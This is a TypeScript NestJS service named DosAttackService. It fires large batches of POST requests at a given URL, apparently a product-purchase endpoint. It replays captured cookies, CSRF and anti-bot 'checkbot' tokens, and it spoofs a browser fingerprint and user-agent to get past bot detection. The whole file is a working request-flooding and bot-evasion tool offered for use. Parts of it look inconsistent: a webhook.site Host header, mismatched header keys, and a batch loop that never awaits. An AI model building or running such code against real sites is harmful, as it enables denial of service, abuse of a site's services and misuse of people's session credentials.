import { Injectable } from '@nestjs/common';
import _ = require('lodash');
import {HttpService} from "@nestjs/axios";

@Injectable()
export class DosAttackService {
  constructor(private readonly http: HttpService) {
  }

  async makeAnAttack(url: string, params: {
    amountOfRequests: number,
    productId: string,
    number: number
  }, requestHeaders: any) {
    const queries = this.makeQueries(url, params, requestHeaders);
    await this.runAllQueries(queries);
  }

  makeQueries(url: string, params: {
    amountOfRequests: number,
    productId: string,
    number: number
  }, headers: any): Promise<any>[] {
    const promises = [];
    for (let i = 0; i  < params.amountOfRequests; i++) {
      try {
        promises.push(this.http.post(url, {
          productId: params.productId,
          number: params.number
        }, {
          headers: {
            'Host': 'webhook.site',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'clienttype': 'web',
            'x-b2b-checkbot-token': headers['x-nft-checkbot-token'],
            'x-b2b-checkbot-sitekey': headers['x-nft-checkbot-sitekey'],
            'x-trace-id': headers['x-trace-id'],
            'x-ui-request-trace': headers['x-ui-request-trace'],
            'content-type': 'application/json',
            'cookie': headers['cookie'],
            'csrftoken': headers['csrftoken'],
            'device-info': 'eyJzY3JlZW5fcmVzb2x1dGlvbiI6Ijg1OCwxNTI1IiwiYXZhaWxhYmxlX3NjcmVlbl9yZXNvbHV0aW9uIjoiODEzLDE1MjUiLCJzeXN0ZW1fdmVyc2lvbiI6IldpbmRvd3MgNyIsImJyYW5kX21vZGVsIjoidW5rbm93biIsInN5c3RlbV9sYW5nIjoiZW4tVVMiLCJ0aW1lem9uZSI6IkdNVCs2IiwidGltZXpvbmVPZmZzZXQiOi0zNjAsInVzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IHJ2OjkzLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvOTMuMCIsImxpc3RfcGx1Z2luIjoiIiwiY2FudmFzX2NvZGUiOiIyOWI5YmU4MyIsIndlYmdsX3ZlbmRvciI6Ikdvb2dsZSBJbmMuIiwid2ViZ2xfcmVuZGVyZXIiOiJBTkdMRSAoSW50ZWwoUikgSEQgR3JhcGhpY3MgRGlyZWN0M0QxMSB2c181XzAgcHNfNV8wKSIsImF1ZGlvIjoiMzUuNzM4MzI5NTkzMDkyMiIsInBsYXRmb3JtIjoiV2luMzIiLCJ3ZWJfdGltZXpvbmUiOiJBc2lhL0FsbWF0eSIsImRldmljZV9uYW1lIjoiRmlyZWZveCBWOTMuMCAoV2luZG93cykiLCJmaW5nZXJwcmludCI6Ijg3YmY0OTA2ZDU3NDc4ZTE0NjAwMzQwYmY3MWUyYTUzIiwiZGV2aWNlX2lkIjoiIiwicmVsYXRlZF9kZXZpY2VfaWRzIjoiMTYyOTEzODQ2NTA4NHBCVTJIS2JOeWhjRWRKRkpHMGksMTYyOTk4Mjk5NzgwMnBPQWVDMGRmcldqUUZxV2NZTmEsMTYyOTk4NTIzMTY3MXlndGlyOFhBOWZWWW93TWFRRDcifQ==',
            'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0'
          }
        }).toPromise());
      } catch(e: any) {
        console.error(`Request crashed with message: ${e.message}`);
      }
    }
    return promises;
  }

  async runAllQueries(queries: any) {
    const batches = _.chunk(queries, 25);
    const results = [];
    while (batches.length) {
      const batch = batches.shift();
      try {
        const result = Promise.all(batch);
        results.push(result);
      } catch(e) {
        console.error(`Request crashed with message: ${e.message}`);
      }
    }
    return _.flatten(results);
  }
}